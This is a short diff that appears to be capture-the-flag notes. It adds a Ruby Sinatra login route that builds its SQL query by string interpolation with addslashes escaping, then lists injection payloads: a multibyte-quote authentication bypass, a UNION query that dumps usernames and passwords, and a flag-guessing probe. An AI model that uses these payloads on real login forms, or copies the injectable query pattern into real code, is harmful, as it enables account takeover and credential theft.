@@ -1,0 +1,19 @@
+post '/login' do
+    @params = Hash[params.map { |key, value| [key, sqli_waf(value)] }]
+    query = "SELECT * FROM users WHERE username='#{addslashes(@params['username'])}' and password='#{addslashes(@params['password'])}'"
+
+    result = db.query(query).first
+
+    if result
+        "Welcome!"
+    else
+        "Incorrect username or password."
+    end
+end
+
+
+SELECT * FROM users WHERE username='#{addslashes(@params['username'])}' and password='#{addslashes(@params['password'])}'
+¿'/**/||/**/10>9/**/--
+PRINT ALL
+¿') UNION ALL SELECT CONCAT(username, 0x3A, password) AS details FROM users LIMIT 0,1;
+' or LEFT(flag,4)='FLAG' -- 
